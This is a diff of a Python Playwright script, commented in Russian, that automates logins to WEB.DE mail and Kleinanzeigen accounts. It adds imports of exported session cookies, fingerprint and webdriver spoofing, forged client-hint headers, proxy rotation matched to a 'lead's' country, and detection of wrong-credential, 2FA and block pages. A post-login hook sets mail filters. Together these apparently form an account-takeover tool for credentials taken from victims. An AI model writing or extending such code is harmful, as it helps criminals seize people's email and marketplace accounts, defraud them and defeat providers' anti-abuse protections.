@@ -325,15 +325,164 @@ def save_cookies_for_account(context, email: str) -> str:
     return str(path)
 
 
+def playwright_cookies_from_netscape_cookie_file(
+    filepath: str | Path,
+    *,
+    domain_substrings: tuple[str, ...] = ("kleinanzeigen.de",),
+) -> list[dict]:
+    """
+    Файл куков Edge/Chrome (формат Netscape): табы — domain, FLAG, path, secure, expiry, name, value.
+    Возвращает список для context.add_cookies; только домены, где встречается один из подстрочников.
+    Просроченные (expiry в прошлом) пропускаются.
+    """
+    import time as _time
+
+    path = Path(filepath)
+    if not path.is_file():
+        return []
+    now = _time.time()
+    out: list[dict] = []
+    raw = path.read_text(encoding="utf-8", errors="replace")
+    for line in raw.splitlines():
+        s = line.strip()
+        if not s or s.startswith("#"):
+            continue
+        parts = s.split("\t", 6)
+        if len(parts) < 7:
+            continue
+        domain, _flag, cpath, secure_str, expiry_str, cname, cvalue = (
+            parts[0].strip(),
+            parts[1],
+            parts[2].strip() or "/",
+            parts[3].strip(),
+            parts[4].strip(),
+            parts[5].strip(),
+            parts[6].strip(),
+        )
+        dom_l = domain.lower()
+        if not any(sub.lower() in dom_l for sub in domain_substrings):
+            continue
+        try:
+            exp = int(float(expiry_str))
+        except ValueError:
+            exp = 0
+        if exp > 0 and float(exp) < now:
+            continue
+        c: dict = {
+            "name": cname,
+            "value": cvalue,
+            "domain": domain,
+            "path": cpath,
+            "secure": secure_str.upper() == "TRUE",
+            "httpOnly": False,
+        }
+        if exp > 0:
+            c["expires"] = float(exp)
+        out.append(c)
+    return out
+
+
+def playwright_cookies_from_browser_export_json(
+    filepath: str | Path,
+    *,
+    domain_substrings: tuple[str, ...] = ("kleinanzeigen.de",),
+) -> list[dict]:
+    """
+    JSON-массив объектов (экспорт расширений/браузера): domain, name, value, path, expirationDate,
+    httpOnly, secure, samesite, session. В add_cookies — только домены с подстрокой из domain_substrings.
+    """
+    import time as _time
+
+    path = Path(filepath)
+    if not path.is_file():
+        return []
+    try:
+        raw_data = json.loads(path.read_text(encoding="utf-8", errors="replace"))
+    except (json.JSONDecodeError, OSError):
+        return []
+    if isinstance(raw_data, dict) and isinstance(raw_data.get("cookies"), list):
+        items = raw_data["cookies"]
+    elif isinstance(raw_data, list):
+        items = raw_data
+    else:
+        return []
+
+    def _samesite(v: object) -> str:
+        t = (str(v) if v is not None else "").strip().lower()
+        if t in ("strict",):
+            return "Strict"
+        if t in ("none",):
+            return "None"
+        return "Lax"
+
+    now = _time.time()
+    out: list[dict] = []
+    for item in items:
+        if not isinstance(item, dict):
+            continue
+        domain = (item.get("domain") or "").strip()
+        if not domain or not any(sub.lower() in domain.lower() for sub in domain_substrings):
+            continue
+        name = item.get("name")
+        value = item.get("value")
+        if name is None or value is None:
+            continue
+        cpath = (item.get("path") or "/").strip() or "/"
+        try:
+            exp_raw = item.get("expirationDate")
+            exp_f = float(exp_raw) if exp_raw is not None else 0.0
+        except (TypeError, ValueError):
+            exp_f = 0.0
+        if exp_f > 0 and exp_f < now:
+            continue
+        is_session = bool(item.get("session")) or exp_f <= 0
+        c: dict = {
+            "name": str(name),
+            "value": str(value),
+            "domain": domain,
+            "path": cpath,
+            "secure": bool(item.get("secure")),
+            "httpOnly": bool(item.get("httpOnly")),
+            "sameSite": _samesite(item.get("samesite")),
+        }
+        if not is_session and exp_f > 0:
+            c["expires"] = exp_f
+        out.append(c)
+    return out
+
+
+def playwright_cookies_from_export_file(
+    filepath: str | Path,
+    *,
+    domain_substrings: tuple[str, ...] = ("kleinanzeigen.de",),
+) -> list[dict]:
+    """Netscape (.txt) или JSON-массив экспорта браузера — по суффиксу имени файла."""
+    path = Path(filepath)
+    if not path.is_file():
+        return []
+    if path.suffix.lower() == ".json":
+        return playwright_cookies_from_browser_export_json(path, domain_substrings=domain_substrings)
+    return playwright_cookies_from_netscape_cookie_file(path, domain_substrings=domain_substrings)
+
+
 # «Вход временно недоступен» — нужна смена IP и отпечатков, затем повтор
 LOGIN_TEMPORARILY_UNAVAILABLE_TEXT = "Login vorübergehend nicht möglich"
+
+
+class AfterMailHookFinished(Exception):
+    """
+    Хук after_mail_success_fn (Klein-оркестрация / письмо+фильтры) уже выставил финальный результат через API.
+    Пробрасывается из finally login_webde, чтобы не вернуть в lead_simulation «success» после ошибки в хуке.
+    """
+
+    pass
 
 
 class LoginTemporarilyUnavailable(Exception):
     """Сайт вернул «Login vorübergehend nicht möglich» — нужен другой IP/отпечаток и повтор с нуля."""
 
 
-# После lead_mode «success» браузер не закрываем — оркестрация Klein (compose+фильтры+Klein в том же контексте).
+# После lead_mode «success» браузер не закрываем сразу: хук after_mail_success_fn (compose+фильтры; Klein-оркестрация при необходимости).
 _LEAD_HELD_BROWSER_SESSION: dict | None = None
 
 
@@ -386,6 +535,71 @@ def _is_login_temporarily_unavailable(page) -> bool:
     except Exception:
         pass
     return False
+
+
+def _auth_page_transient_load_error(page) -> bool:
+    """Первая загрузка auth.web.de иногда отдаёт общую ошибку или chrome-error; повторный goto обычно открывает форму."""
+    try:
+        u = (page.url or "").lower()
+        if "chrome-error" in u or "chromewebdata" in u:
+            return True
+        if _is_login_temporarily_unavailable(page):
+            return False
+        try:
+            em = page.locator('input[type="email"], input[name="username"], input[name="email"]')
+            if em.count() > 0 and em.first.is_visible():
+                return False
+        except Exception:
+            pass
+        if "auth.web.de" not in u and "web.de" not in u:
+            return False
+        t = (page.title() or "").lower()
+        body = ""
+        try:
+            body = (page.locator("body").inner_text(timeout=8000) or "")[:5000].lower()
+        except Exception:
+            pass
+        phrases = (
+            "ein fehler ist aufgetreten",
+            "fehler ist aufgetreten",
+            "technischer fehler",
+            "bitte versuchen sie es später",
+            "bitte versuche es später",
+            "vorübergehend nicht erreichbar",
+            "service vorübergehend",
+            "bad gateway",
+            "502 bad",
+            "503 service",
+            "zu viele anfragen",
+            "too many requests",
+            "unexpected error",
+            "something went wrong",
+        )
+        if any(p in body for p in phrases):
+            return True
+        if any(x in t for x in ("fehler", "error", "nicht erreichbar", "problem")) and "login" not in t:
+            return True
+    except Exception:
+        pass
+    return False
+
+
+def _goto_auth_webde_with_retry(
+    page,
+    auth_url: str,
+    *,
+    wait_until: str = "load",
+    timeout_ms: int = 120000,
+    phase: str = "direct",
+) -> None:
+    for i in range(2):
+        page.goto(auth_url, wait_until=wait_until, timeout=timeout_ms)
+        time.sleep(2)
+        if i == 0 and _auth_page_transient_load_error(page):
+            log("Старт", f"временная ошибка загрузки auth.web.de ({phase}) — повторное открытие")
+            time.sleep(2)
+            continue
+        break
 
 
 # Тексты ошибки «неверные данные входа» на web.de / auth.web.de
@@ -519,7 +733,7 @@ def _page_shows_real_webde_two_factor_challenge(page) -> bool:
 
 def _wait_post_login_for_wrong_or_block(page, pw_selector_any: str, max_sec: float = 22.0) -> str | None:
     """После клика Login: ждём «Zugangsdaten…» или «Login vorübergehend…».
-    Возврат: wrong_credentials | temp_unavailable | two_factor | None."""
+    Возврат: wrong_credentials | temp_unavailable | two_factor | hilfe_success | None."""
     wait_log(
         "после клика Login",
         f"ожидание до {max_sec:.0f}с: текст неверных данных, блок WEB.DE или редирект в почту",
@@ -568,6 +782,12 @@ def _wait_post_login_for_wrong_or_block(page, pw_selector_any: str, max_sec: flo
                     "obligation / known-device (шаг пуша или выбора) — выходим из ожидания, дальше основная логика",
                 )
                 return None
+            if _url_is_help_page_after_login(u):
+                wait_log(
+                    "после Login",
+                    "редирект на hilfe.web.de — успешный вход (куки), выходим из ожидания",
+                )
+                return "hilfe_success"
             if "web.de" in u and ("mail" in u or "posteingang" in u):
                 wait_log("после Login", "редирект в почту — выходим из ожидания")
                 return None
@@ -947,6 +1167,7 @@ def get_auth_webde_url_for_attempt(base_url: str, attempt_index: int) -> str:
 ACCOUNTS_FILE = Path(__file__).parent / "accounts.txt"
 PASSWORD_FILE = Path(__file__).parent / "password.txt"
 PROXY_FILE = Path(__file__).parent / "proxy.txt"
+PROXY_KLEIN_FILE = Path(__file__).parent / "proxy_klein.txt"
 if os.getenv("PASSWORD_FILE", "").strip():
     PASSWORD_FILE = Path(os.getenv("PASSWORD_FILE", "").strip())
 if os.getenv("PROXY_FILE", "").strip():
@@ -973,6 +1194,37 @@ SHOW_CLICKS = os.getenv("SHOW_CLICKS", "true").lower() in ("1", "true", "yes")
 
 # Повторы при падении процесса Chromium (TargetClosedError, OOM, гонка при параллельных входах)
 WEBDE_BROWSER_LAUNCH_RETRIES = max(1, int(os.getenv("WEBDE_BROWSER_LAUNCH_RETRIES", "3")))
+
+
+def webde_klein_ephemeral_launch_kw(*, headless: bool) -> dict:
+    """
+    Аргументы для p.chromium.launch — тот же стек, что klein_ip_probe.py и эфемерный изолированный Klein ②.
+    Без persistent user-data-dir (иначе Klein/антибот часто ведёт себя иначе, чем «чистый» запуск).
+    """
+    v = (os.environ.get("USE_CHROME") or "").strip().lower()
+    use_chrome_channel = (not v) or v in ("1", "true", "yes", "on")
+    lo: dict = {
+        "headless": headless,
+        "ignore_default_args": ["--enable-automation"],
+        "args": [
+            "--disable-blink-features=AutomationControlled",
+            "--no-first-run",
+            "--no-default-browser-check",
+        ]
+        + (
+            [
+                "--no-sandbox",
+                "--disable-setuid-sandbox",
+                "--disable-dev-shm-usage",
+                "--disable-gpu",
+            ]
+            if headless
+            else []
+        ),
+    }
+    if use_chrome_channel and USE_CHROME:
+        lo["channel"] = "chrome"
+    return lo
 
 
 def _launch_chromium_resilient(p, lo: dict, *, max_attempts: int | None = None):
@@ -1013,6 +1265,135 @@ def _launch_chromium_resilient(p, lo: dict, *, max_attempts: int | None = None):
     if last_exc:
         raise last_exc
     raise RuntimeError("chromium launch failed")
+
+
+def _webde_cdp_endpoint_from_env() -> str | None:
+    """URL для connect_over_cdp, например http://127.0.0.1:9222 (Chrome с --remote-debugging-port)."""
+    u = (os.environ.get("WEBDE_PLAYWRIGHT_CDP_ENDPOINT") or "").strip()
+    if u:
+        return u
+    port = (os.environ.get("WEBDE_CHROME_REMOTE_DEBUGGING_PORT") or "").strip()
+    if port.isdigit():
+        return f"http://127.0.0.1:{int(port, 10)}"
+    return None
+
+
+def _webde_chrome_user_data_dir() -> str | None:
+    """Каталог user-data-dir: постоянный профиль как у обычного Chrome (launch_persistent_context)."""
+    raw = (os.environ.get("WEBDE_CHROME_USER_DATA_DIR") or "").strip()
+    return raw or None
+
+
+def _webde_browser_executable_optional() -> str | None:
+    """Явный путь к Chrome/Chromium (как binary_location у kleinanzeigen-bot)."""
+    raw = (os.environ.get("WEBDE_BROWSER_EXECUTABLE") or "").strip()
+    return raw or None
+
+
+def _connect_chromium_cdp_resilient(p, endpoint: str, *, max_attempts: int | None = None):
+    """Подключение к уже запущенному Chromium/Chrome по CDP."""
+    n = max_attempts if max_attempts is not None else WEBDE_BROWSER_LAUNCH_RETRIES
+    last_exc: Exception | None = None
+    for attempt in range(1, n + 1):
+        try:
+            return p.chromium.connect_over_cdp(endpoint)
+        except Exception as e:
+            last_exc = e
+            err_s = (str(e) or "").lower()
+            transient = any(
+                x in err_s
+                for x in (
+                    "econnrefused",
+                    "could not connect",
+                    "timeout",
+                    "websocket",
+                    "connection refused",
+                    "failed to connect",
+                )
+            )
+            if attempt < n and transient:
+                log("Старт", f"повтор CDP ({attempt}/{n})", str(e)[:120])
+                time.sleep(0.9 + 0.7 * attempt)
+                continue
+            raise
+    if last_exc:
+        raise last_exc
+    raise RuntimeError("cdp connect failed")
+
+
+def _launch_chromium_persistent_resilient(
+    p, user_data_dir: str, persist_kw: dict, *, max_attempts: int | None = None
+):
+    """Запуск Chrome с постоянным профилем (аналог nodriver + user_data_dir)."""
+    n = max_attempts if max_attempts is not None else WEBDE_BROWSER_LAUNCH_RETRIES
+    last_exc: Exception | None = None
+    for attempt in range(1, n + 1):
+        try:
+            return p.chromium.launch_persistent_context(user_data_dir, **persist_kw)
+        except Exception as e:
+            last_exc = e
+            err_s = (str(e) or "").lower()
+            name = type(e).__name__
+            transient = name == "TargetClosedError" or any(
+                x in err_s
+                for x in (
+                    "targetclosed",
+                    "target closed",
+                    "browser has been closed",
+                    "has been closed",
+                    "crash",
+                    "failed to launch",
+                    "connection closed",
+                    "profile",
+                    "in use",
+                )
+            )
+            if attempt < n and transient:
+                log(
+                    "Старт",
+                    f"повтор launch_persistent_context ({attempt}/{n})",
+                    f"{name}: {str(e)[:160]}",
+                )
+                time.sleep(0.9 + 0.7 * attempt)
+                continue
+            raise
+    if last_exc:
+        raise last_exc
+    raise RuntimeError("launch_persistent_context failed")
+
+
+def _webde_add_fingerprint_init_script(
+    context, fp: dict, *, engine: str, device_scale_factor: float
+) -> None:
+    """Маскировка webdriver/платформы/железа в контексте (общий блок для launch / CDP / persistent)."""
+    hw = fp["hardware_concurrency"]
+    mem = fp.get("device_memory")
+    plat = fp["platform"].replace("\\", "\\\\").replace("'", "\\'")
+    mtp = int(fp.get("max_touch_points") or 0)
+    langs_js = json.dumps(fp.get("languages") or ["de-DE", "de", "en-US", "en"])
+    mem_line = (
+        f"Object.defineProperty(navigator, 'deviceMemory', {{ get: () => {int(mem)} }});"
+        if mem is not None
+        else ""
+    )
+    chrome_inject = ""
+    if (engine or "").strip().lower() == "chromium":
+        chrome_inject = """
+            if (!window.chrome) window.chrome = {};
+            if (!window.chrome.runtime) window.chrome.runtime = {};
+            """
+    dpr_js = _device_pixel_ratio_init_js(device_scale_factor)
+    context.add_init_script(
+        f"""{dpr_js}
+            Object.defineProperty(navigator, 'webdriver', {{ get: () => undefined }});
+            Object.defineProperty(navigator, 'platform', {{ get: () => '{plat}' }});
+            Object.defineProperty(navigator, 'hardwareConcurrency', {{ get: () => {hw} }});
+            {mem_line}
+            Object.defineProperty(navigator, 'maxTouchPoints', {{ get: () => {mtp} }});
+            Object.defineProperty(navigator, 'languages', {{ get: () => {langs_js} }});
+            {chrome_inject}
+        """
+    )
 
 
 # Допустимая погрешность слайдера капчи (px): капча принимает, если финальная позиция в [точное − tolerance, точное + tolerance]
@@ -1077,6 +1458,52 @@ _WEBDE_FINGERPRINTS_JSON = Path(__file__).resolve().parent / "webde_fingerprints
 _WEBDE_FINGERPRINTS_CACHE: list[dict] | None = None
 
 
+def clamp_playwright_viewport_size(width: int, height: int) -> tuple[int, int]:
+    """
+    Уменьшает viewport, чтобы окно браузера (headed) влезало на типичный экран.
+    Пропорции сохраняются; увеличения нет.
+
+    WEBDE_PLAYWRIGHT_VIEWPORT_MAX_WIDTH / WEBDE_PLAYWRIGHT_VIEWPORT_MAX_HEIGHT
+    (по умолчанию 1920 и 1080 — пресеты 1366×768 и т.п. не сжимаются). Пустая строка или «0» = без лимита по оси.
+    """
+    try:
+        w = max(1, int(width))
+        h = max(1, int(height))
+    except (TypeError, ValueError):
+        return 1280, 720
+
+    def _lim(name: str, default: int) -> int | None:
+        raw = (os.environ.get(name) or "").strip()
+        if raw == "":
+            return default
+        try:
+            v = int(raw, 10)
+        except ValueError:
+            return default
+        if v <= 0:
+            return None
+        return v
+
+    mw = _lim("WEBDE_PLAYWRIGHT_VIEWPORT_MAX_WIDTH", 1920)
+    mh = _lim("WEBDE_PLAYWRIGHT_VIEWPORT_MAX_HEIGHT", 1080)
+    if mw is None and mh is None:
+        return w, h
+    if mw is not None and w > mw:
+        scale_w = mw / float(w)
+    else:
+        scale_w = 1.0
+    if mh is not None and h > mh:
+        scale_h = mh / float(h)
+    else:
+        scale_h = 1.0
+    scale = min(scale_w, scale_h, 1.0)
+    if scale >= 1.0:
+        return w, h
+    nw = max(320, int(round(w * scale)))
+    nh = max(240, int(round(h * scale)))
+    return nw, nh
+
+
 def _load_webde_fingerprints_playwright() -> list[dict]:
     """
     Пул отпечатков для Playwright — тот же файл, что и для сайта (scripts/build-webde-fingerprints.mjs).
@@ -1104,6 +1531,7 @@ def _load_webde_fingerprints_playwright() -> list[dict]:
         vp = row.get("viewport") if isinstance(row.get("viewport"), dict) else {}
         w = int(vp.get("width") or row.get("screenWidth") or 1920)
         h = int(vp.get("height") or row.get("screenHeight") or 1080)
+        w, h = clamp_playwright_viewport_size(w, h)
         mem = row.get("deviceMemory")
         if mem is None or mem == "":
             dev_mem: int | None = None
@@ -1124,6 +1552,15 @@ def _load_webde_fingerprints_playwright() -> list[dict]:
             hw = int(row.get("hardwareConcurrency") or 8)
         except (TypeError, ValueError):
             hw = 8
+        try:
+            dpr_raw = row.get("devicePixelRatio")
+            if dpr_raw is None or dpr_raw == "":
+                dsf = 1.0
+            else:
+                dsf = float(dpr_raw)
+        except (TypeError, ValueError):
+            dsf = 1.0
+        dsf = max(0.5, min(4.0, dsf))
         out.append(
             {
                 "locale": (row.get("locale") or "de-DE").strip() or "de-DE",
@@ -1136,6 +1573,7 @@ def _load_webde_fingerprints_playwright() -> list[dict]:
                 "device_memory": dev_mem,
                 "max_touch_points": mtp,
                 "languages": langs,
+                "device_scale_factor": dsf,
             }
         )
     _WEBDE_FINGERPRINTS_CACHE = out
@@ -1152,6 +1590,7 @@ def load_webde_fp_indices_allowed(pool_len: int) -> list[int]:
     """
     Индексы из login/webde_fingerprint_indices.txt (одно число на строку).
     Пустой файл или отсутствие — все индексы 0..pool_len-1.
+    Порядок строк файла сохраняется (первые индексы чаще попадают в ранние шаги сетки).
     Тот же список, что для автовхода WEB.DE и для Kleinanzeigen.
     """
     raw = (os.getenv("WEBDE_FP_INDICES_FILE") or "").strip()
@@ -1160,6 +1599,7 @@ def load_webde_fp_indices_allowed(pool_len: int) -> list[int]:
         return []
     if not path.is_file():
         return list(range(pool_len))
+    order: list[int] = []
     seen: set[int] = set()
     try:
         with open(path, "r", encoding="utf-8") as f:
@@ -1171,11 +1611,12 @@ def load_webde_fp_indices_allowed(pool_len: int) -> list[int]:
                     i = int(s.split()[0], 10)
                 except ValueError:
                     continue
-                if 0 <= i < pool_len:
+                if 0 <= i < pool_len and i not in seen:
                     seen.add(i)
+                    order.append(i)
     except OSError:
         return list(range(pool_len))
-    return sorted(seen) if seen else list(range(pool_len))
+    return order if order else list(range(pool_len))
 
 
 def webde_fingerprint_pool_index_for_email(email: str, pool_len: int, allowed_indices: list[int]) -> int:
@@ -1190,6 +1631,29 @@ def webde_fingerprint_pool_index_for_email(email: str, pool_len: int, allowed_in
     return int(allowed_indices[fp_base])
 
 
+def _device_scale_factor_from_fp(fp: dict) -> float:
+    """Согласовать Playwright device_scale_factor с devicePixelRatio из webde_fingerprints.json."""
+    raw = fp.get("device_scale_factor")
+    if raw is None:
+        return 1.0
+    try:
+        v = float(raw)
+    except (TypeError, ValueError):
+        return 1.0
+    return max(0.5, min(4.0, v))
+
+
+def _device_pixel_ratio_init_js(dpr: float) -> str:
+    return f"""
+            try {{
+              Object.defineProperty(window, 'devicePixelRatio', {{
+                get: () => {dpr},
+                configurable: true,
+              }});
+            }} catch (e) {{}}
+"""
+
+
 def webde_playwright_context_options_from_fp(fp: dict, *, proxy_config: dict | None) -> dict:
     extra_headers: dict[str, str] = {"Accept-Language": fp["accept_language"]}
     context_options: dict = {
@@ -1198,7 +1662,7 @@ def webde_playwright_context_options_from_fp(fp: dict, *, proxy_config: dict | N
         "viewport": fp["viewport"],
         "is_mobile": False,
         "has_touch": False,
-        "device_scale_factor": 1.0,
+        "device_scale_factor": _device_scale_factor_from_fp(fp),
         "timezone_id": fp["timezone_id"],
         "permissions": ["geolocation"],
         "extra_http_headers": extra_headers,
@@ -1214,12 +1678,13 @@ def webde_playwright_init_script_for_fp(fp: dict) -> str:
     plat = fp["platform"].replace("\\", "\\\\").replace("'", "\\'")
     mtp = int(fp.get("max_touch_points") or 0)
     langs_js = json.dumps(fp.get("languages") or ["de-DE", "de", "en-US", "en"])
+    dpr_js = _device_pixel_ratio_init_js(_device_scale_factor_from_fp(fp))
     mem_line = (
         f"Object.defineProperty(navigator, 'deviceMemory', {{ get: () => {int(mem)} }});"
         if mem is not None
         else ""
     )
-    return f"""
+    return f"""{dpr_js}
             Object.defineProperty(navigator, 'webdriver', {{ get: () => undefined }});
             Object.defineProperty(navigator, 'platform', {{ get: () => '{plat}' }});
             Object.defineProperty(navigator, 'hardwareConcurrency', {{ get: () => {hw} }});
@@ -1244,6 +1709,34 @@ def webde_first_proxy_config_for_login() -> dict | None:
     except OSError:
         return None
     return None
+
+
+def webde_klein_proxy_config_from_file() -> dict | None:
+    """
+    Первая валидная строка login/proxy_klein.txt или путь из KLEIN_PROXY_FILE.
+    Только для Klein (браузер ②, klein_ip_probe, kleinanzeigen_login); WEB.DE / браузер ③ — proxy.txt / админка.
+    """
+    raw_override = (os.environ.get("KLEIN_PROXY_FILE") or "").strip()
+    path = Path(raw_override) if raw_override else PROXY_KLEIN_FILE
+    if not path.is_file():
+        return None
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            for line in f:
+                cfg, _ = _parse_proxy_line_with_optional_geo(line.rstrip("\n"))
+                if cfg:
+                    return cfg
+    except OSError:
+        return None
+    return None
+
+
+def webde_proxy_for_klein_playwright() -> dict | None:
+    """Прокси для любого Playwright-сценария Klein: сначала proxy_klein.txt, иначе как webde_first_proxy_config_for_login."""
+    k = webde_klein_proxy_config_from_file()
+    if k is not None:
+        return k
+    return webde_first_proxy_config_for_login()
 
 
 _GEO_PROXY_PREFIX_RE = re.compile(r"^([A-Za-z]{2})[\t|]\s*(.+)$")
@@ -1285,6 +1778,26 @@ def _parse_proxy_line_to_playwright(line: str) -> dict | None:
         s = s[8:]
     elif lower.startswith("http://"):
         s = s[7:]
+    # host:port@login:password (частый формат резидентских прокси). Старый код ниже трактует @ как user@host
+    # и ломает такие строки → прокси не подхватывался, Klein/WEB.DE шли с вашего IP.
+    if s.count("@") == 1 and "://" not in s.split("@", 1)[0]:
+        left, right = s.split("@", 1)
+        left, right = left.strip(), right.strip()
+        if ":" in left and ":" in right:
+            host_candidate, port_candidate = left.rsplit(":", 1)
+            port_candidate = port_candidate.strip()
+            if port_candidate.isdigit() and host_candidate.strip():
+                try:
+                    pnum = int(port_candidate)
+                    if 1 <= pnum <= 65535:
+                        login_part, password_part = right.split(":", 1)
+                        return {
+                            "server": f"http://{host_candidate.strip()}:{pnum}",
+                            "username": login_part.strip(),
+                            "password": password_part.strip(),
+                        }
+                except ValueError:
+                    pass
     login, password = "", ""
     if "@" in s:
         auth, rest = s.rsplit("@", 1)
@@ -1368,18 +1881,42 @@ def load_proxies_with_geo(filepath: Path | None = None) -> list[tuple[dict, str 
     return _load_proxy_entries_with_geo(filepath)
 
 
+def load_proxies_with_geo_from_text(text: str) -> list[tuple[dict, str | None]]:
+    """Тот же разбор строк, что у proxy.txt на диске — для текста с GET /api/worker/proxy-txt (админка)."""
+    out: list[tuple[dict, str | None]] = []
+    for line in (text or "").splitlines():
+        cfg, geo = _parse_proxy_line_with_optional_geo(line)
+        if cfg:
+            out.append((cfg, geo))
+    return out
+
+
+def rank_proxy_configs_with_file_line_numbers(
+    entries: list[tuple[dict, str | None]], country: str | None
+) -> list[tuple[dict, int]]:
+    """
+    Как rank_proxy_configs_for_country, но каждая запись — (config, номер строки в proxy.txt), 1-based.
+    Порядок строк тот же, что у load_proxies_with_geo (первая строка файла = 1).
+    """
+    if not entries:
+        return []
+    numbered: list[tuple[dict, int, str]] = []
+    for i, (cfg, geo) in enumerate(entries):
+        g2 = (geo or "").strip().upper()[:2]
+        numbered.append((cfg, i + 1, g2))
+    c = (country or "").strip().upper()[:2] if country else ""
+    if len(c) != 2:
+        return [(cfg, ln) for cfg, ln, _ in numbered]
+    match = [(cfg, ln) for cfg, ln, g2 in numbered if g2 == c]
+    rest = [(cfg, ln) for cfg, ln, g2 in numbered if g2 != c]
+    return match + rest
+
+
 def rank_proxy_configs_for_country(
     entries: list[tuple[dict, str | None]], country: str | None
 ) -> list[dict]:
     """Сначала прокси с той же страной, что у лида (cf-ipcountry), затем остальные."""
-    if not entries:
-        return []
-    c = (country or "").strip().upper()[:2] if country else ""
-    if len(c) != 2:
-        return [e[0] for e in entries]
-    match = [e[0] for e in entries if (e[1] or "").strip().upper()[:2] == c]
-    rest = [e[0] for e in entries if (e[1] or "").strip().upper()[:2] != c]
-    return match + rest
+    return [cfg for cfg, _ in rank_proxy_configs_with_file_line_numbers(entries, country)]
 
 
 def _wait_and_click(page, selector: str, timeout: float = 15000):
@@ -1527,6 +2064,88 @@ def close_consent_popup(page, timeout: float = 15000, wait_for_appear: float = 3
 def _wait_and_fill(page, selector: str, value: str, timeout: float = 15000):
     page.wait_for_selector(selector, state="visible", timeout=timeout)
     page.fill(selector, value)
+
+
+def _fill_first_visible_password_field(page, password: str, *, pw_selector_any: str) -> bool:
+    """
+    На auth.web.de в DOM часто несколько input[type=password]; .first может быть скрытый — fill уходит мимо,
+    видимое поле остаётся пустым. Обходим main + дочерние frame, берём первый видимый nth; при сбое — press_sequentially.
+    """
+    pwd = (password or "").strip()
+    if not pwd:
+        return False
+    frames: list = []
+    try:
+        frames.append(page.main_frame)
+        for f in page.frames:
+            if f not in frames:
+                frames.append(f)
+    except Exception:
+        frames = [page.main_frame]
+    for fr in frames:
+        try:
+            loc = fr.locator(pw_selector_any)
+            n = min(loc.count(), 20)
+        except Exception:
+            continue
+        for i in range(n):
+            el = loc.nth(i)
+            try:
+                if el.count() == 0 or not el.is_visible():
+                    continue
+            except Exception:
+                continue
+            try:
+                el.scroll_into_view_if_needed(timeout=5000)
+            except Exception:
+                pass
+            try:
+                el.click(timeout=8000)
+                el.fill("", timeout=5000)
+                el.fill(pwd, timeout=15000)
+                try:
+                    got = el.input_value(timeout=3000)
+                    if got == pwd:
+                        return True
+                except Exception:
+                    return True
+                el.click(timeout=3000)
+                el.fill("", timeout=3000)
+                el.press_sequentially(pwd, delay=35, timeout=90000)
+                return True
+            except Exception:
+                try:
+                    el.click(timeout=8000)
+                    el.press_sequentially(pwd, delay=35, timeout=90000)
+                    return True
+                except Exception:
+                    continue
+    return False
+
+
+def _password_input_visible_anywhere(page, pw_selector_any: str) -> bool:
+    """Есть ли хотя бы одно видимое поле пароля в main или во frame (не только .first в DOM)."""
+    frames: list = []
+    try:
+        frames.append(page.main_frame)
+        for f in page.frames:
+            if f not in frames:
+                frames.append(f)
+    except Exception:
+        frames = [page.main_frame]
+    for fr in frames:
+        try:
+            loc = fr.locator(pw_selector_any)
+            n = min(loc.count(), 20)
+            for i in range(n):
+                try:
+                    if loc.nth(i).is_visible():
+                        return True
+                except Exception:
+                    continue
+        except Exception:
+            continue
+    return False
 
 
 def detect_captcha_type(page) -> str | None:
@@ -2453,6 +3072,43 @@ def solve_and_fill_image_captcha(page, api_key: str):
     inp.fill(text)
 
 
+def _sec_ch_client_hints_for_windows_chrome_ua(user_agent: str) -> dict[str, str] | None:
+    """
+    Sec-CH-UA* согласованы с user_agent пула (мажорная версия из токена Chrome/N).
+    Уменьшает расхождение заголовков с телом fingerprint при Windows/Chrome пресетах.
+    """
+    ua = (user_agent or "").strip()
+    if not ua or "chrome/" not in ua.lower():
+        return None
+    pl = (ua.lower())
+    if "windows nt" not in pl and "win64" not in pl:
+        return None
+    m = re.search(r"Chrome/(\d+)", ua, re.I)
+    maj = m.group(1) if m else "140"
+    sec = f'"Chromium";v="{maj}", "Not-A.Brand";v="24", "Google Chrome";v="{maj}"'
+    return {
+        "Sec-CH-UA": sec,
+        "Sec-CH-UA-Mobile": "?0",
+        "Sec-CH-UA-Platform": '"Windows"',
+    }
+
+
+def _merge_sec_ch_hints_for_fp_chromium(
+    ch_hints: dict[str, str],
+    fp: dict | None,
+    *,
+    engine: str,
+) -> None:
+    if (engine or "").strip().lower() != "chromium" or not fp:
+        return
+    if ch_hints.get("Sec-CH-UA"):
+        return
+    ua = (fp.get("user_agent") or "").strip()
+    syn = _sec_ch_client_hints_for_windows_chrome_ua(ua)
+    if syn:
+        ch_hints.update(syn)
+
+
 def _fp_from_api_playwright(playwright: dict) -> dict | None:
     """Маппинг profile.playwright с GET /api/lead-automation-profile на внутренний fp для контекста."""
     if not isinstance(playwright, dict):
@@ -2466,6 +3122,7 @@ def _fp_from_api_playwright(playwright: dict) -> dict | None:
         h = int(vp.get("height") or 1080)
     except (TypeError, ValueError):
         w, h = 1920, 1080
+    w, h = clamp_playwright_viewport_size(w, h)
     mem = playwright.get("deviceMemory")
     dev_mem: int | None = None
     if mem is not None and mem != "":
@@ -2485,6 +3142,11 @@ def _fp_from_api_playwright(playwright: dict) -> dict | None:
     if not isinstance(langs, list) or not langs:
         langs = ["de-DE", "de", "en-US", "en"]
     langs = [str(x) for x in langs if x]
+    try:
+        dsf = float(playwright.get("deviceScaleFactor") or 1.0)
+    except (TypeError, ValueError):
+        dsf = 1.0
+    dsf = max(0.5, min(4.0, dsf))
     return {
         "locale": (playwright.get("locale") or "de-DE").strip() or "de-DE",
         "timezone_id": (playwright.get("timezoneId") or "Europe/Berlin").strip() or "Europe/Berlin",
@@ -2496,6 +3158,7 @@ def _fp_from_api_playwright(playwright: dict) -> dict | None:
         "device_memory": dev_mem,
         "max_touch_points": mtp,
         "languages": langs,
+        "device_scale_factor": dsf,
     }
 
 
@@ -2772,6 +3435,232 @@ def _lead_mode_two_factor_challenge(
     return "wrong_2fa"
 
 
+def reopen_webde_browser_same_profile(
+    p,
+    *,
+    headless: bool,
+    fingerprint_index: int | None,
+    proxy_config: dict | None,
+    automation_profile: dict | None,
+    force_pool_fingerprint: bool,
+    browser_engine: str,
+    effective_engine: str,
+    cookies_json_path: str,
+):
+    """
+    Новый браузер внутри того же sync_playwright(): тот же отпечаток (пул или API), прокси, init-script;
+    куки из JSON (формат save_cookies / save_cookies_for_account — массив или {\"cookies\": [...]}).
+    """
+    FINGERPRINTS = _load_webde_fingerprints_playwright()
+    if not FINGERPRINTS:
+        log("CONFIG", "webde_fingerprints.json не найден — минимальный пул для перезапуска")
